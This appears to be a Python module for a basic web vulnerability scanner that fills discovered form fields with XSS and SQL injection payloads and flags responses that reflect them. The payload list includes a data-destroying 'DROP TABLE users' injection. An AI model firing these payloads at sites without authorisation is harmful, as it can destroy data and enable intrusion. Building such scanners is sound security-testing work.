import requests
from urllib.parse import urljoin

# Predefined payloads
payloads = {
    "XSS": ['<script>alert(1)</script>', '" onmouseover="alert(1)', "'><svg/onload=alert(1)>"],
    "SQLi": ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"],
}

def get_form_details(form):
    details = {
        "action": form.get("action"),
        "method": form.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        input_type = input_tag.get("type", "text")
        value = input_tag.get("value", "")
        details["inputs"].append({"name": name, "type": input_type, "value": value})
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = input["value"]

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except requests.exceptions.RequestException as e:
        print(f"Request to {target_url} failed: {e}")
        return None

def scan_forms(forms):
    results = []

    for form_url, form in forms:
        form_details = get_form_details(form)

        for vuln_type, test_payloads in payloads.items():
            for payload in test_payloads:
                response = submit_form(form_details, form_url, payload)

                if response and payload in response.text:
                    results.append({
                        "url": form_url,
                        "vulnerability": vuln_type,
                        "payload": payload,
                        "evidence_snippet": response.text[:200]
                    })

    return results
